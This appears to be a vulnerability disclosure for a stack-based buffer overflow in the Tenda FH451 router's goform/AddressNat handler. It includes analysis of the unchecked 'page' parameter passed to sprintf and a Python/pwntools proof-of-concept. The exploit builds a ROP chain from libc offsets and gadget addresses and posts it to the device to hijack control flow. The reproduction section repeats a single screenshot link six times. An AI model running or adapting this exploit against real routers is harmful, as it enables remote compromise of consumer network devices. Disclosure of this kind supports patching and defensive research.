# Shenzhen Jixiang Tengda Technology Co., Ltd. FH451 has a Remote Code Execution vulnerability

**Vulnerability URL**: [http://0.0.0.0:80/goform/AddressNat](http://0.0.0.0:80/goform/AddressNat)

**Firmware Download Link:** [https://www.tenda.com.cn/material/show/1629](https://www.tenda.com.cn/material/show/1629)

## Vulnerability Analysis
The vulnerability occurs in the `fromAddressNat` function.

![Image 1](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat1.png)

The program retrieves the user input parameter `page` at line 14 but does not perform any size check. When the parameter value is excessively large, it will causes a stack overflow in the `sprintf` function at line 15, which can lead to a program crash or potential exploitation.  
Cross-referenced location: from the `fromAddressNat` function, routed to `AddressNat`, at line 73.
![Image 2](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat2.png)
Further cross-referenced to the `sub_64EAC` function, with attention to lines 44 and 47.
![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)

It can be determined that the vulnerability occurs at the page path `goform/AddressNat`.

## payload
```python
import requests
from pwn import *

libc = ELF('./lib/libc.so.0')
system_offset = libc.symbols["system"]
base = 0x3fe36000

system_addr = base + system_offset
puts = base+libc.symbols['puts']
str = b"hello-I-am-fzz\x00"
mov_r0 = base+0x00040cb8 # mov r0, sp; blx r3;
pop_r3 = base+0x00018298 # pop {r3, pc};

url = "http://0.0.0.0:80/goform/addressNat"
payload = b'a'*256 + p32(pop_r3)+p32(puts)+p32(mov_r0)+str
data = {"page": payload}
res = requests.post(url, data=data)
```

# reproduce
![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)
![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)
![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)
![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)
![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)
![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)
